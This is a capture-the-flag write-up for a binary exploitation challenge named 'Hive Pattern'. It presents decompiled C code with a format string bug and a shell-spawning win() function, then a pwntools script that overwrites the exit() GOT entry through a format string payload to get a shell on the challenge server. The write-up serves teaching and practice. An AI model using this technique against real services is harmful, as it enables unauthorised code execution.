# Hive Pattern

## Introduction
In this challenge we are given a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/dci_summercamp2026/pod) without 
source code.

## Reverse engineering
Decompiling the binary with angr's decompiler 
yields the following:
```c
typedef struct FILE {
} FILE;

extern FILE *GLIBC_2.2.5::stderr;
extern FILE *GLIBC_2.2.5::stdin;
extern FILE *__bss_start;

void setup(void)
{
    setbuf(GLIBC_2.2.5::stdin, NULL);
    setbuf(__bss_start, NULL);
    setbuf(GLIBC_2.2.5::stderr, NULL);
    return;
}

int win(void)
{
    return system("/bin/sh");
}

typedef struct FILE {
} FILE;

extern FILE *GLIBC_2.2.5::stdin;
extern char max_tentative;

int choice_orchester(void)
{
    int v0;  // [bp-0x9c]
    char v1[140];  // [bp-0x98]
    int v2;  // [bp-0xc]

    v2 = 0;
    while (true)
    {
        if (v2 >= *((int *)&max_tentative))
        {
            puts("\nYou're not a very good detective, are you?");
            exit(1); /* do not return */
        }
        printf("\nChoose an orchester (1 to 4): ");
        if (!fgets(&v1, 128, GLIBC_2.2.5::stdin))
            exit(1); /* do not return */
        if ((int)__isoc23_sscanf(&v1, "%d", &v0, "%d") == 1 && v0 > 0 && v0 <= 4)
        {
            printf("Orchester %d... that's not the one hiding the secret.\n", v0);
            return v0;
        }
        v2 += 1;
        printf(&v1);
        if (v2 < *((int *)&max_tentative))
            printf("Attempts remaining: %d\n", *((int *)&max_tentative) - v2);
    }
}

extern char *banner;

unsigned int main(void)
{
    setup();
    printf("%s", banner);
    choice_orchester();
    return 0;
}

```
In it we see two things: first, a `win()` function
that spawns a shell:
```c
int win(void)
{
    return system("/bin/sh");
}
```
And a format string bug in `choice_orchester()`:
```c
printf("\nChoose an orchester (1 to 4): ");
if (!fgets(&v1, 128, GLIBC_2.2.5::stdin))
    exit(1); /* do not return */
if ((int)__isoc23_sscanf(&v1, "%d", &v0, "%d") == 1 && v0 > 0 && v0 <= 4)
{
    printf("Orchester %d... that's not the one hiding the secret.\n", v0);
    return v0;
}
v2 += 1;
printf(&v1);
```

## Exploitation

after a quick look at the binary's protections,
we see that is has no RELRO:
```fish
[I] ◆ hive_pattern ❯❯❯ pwn checksec chall
[*] './chall'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

This means we can overwrite GOT entries:
looking again at the source code,we see the following:
```c
if (v2 >= *((int *)&max_tentative))
{
    puts("\nYou're not a very good detective, are you?");
    exit(1); /* do not return */
}
```
Exceeding the maximum number of attempts (which you can odo by repeatedly submitting `%d` ) causes the program
to call `exit()`, which is a perfect target for a GOT overwrite. Writing the final exploit then yields the following:
```python
from pwn import *
target = remote("f46379869da3d783aa036eff2246c731-Hive-pattern.ctf",8888)
context.arch = 'amd64'
elf = ELF("./chall")
write = {
    elf.got['exit']:elf.symbols['win']
}
payload = fmtstr_payload(writes=write,numbwritten=0,offset=8)
target.sendline(payload)
target.send(b'%d\n'*2)

target.interactive()
```
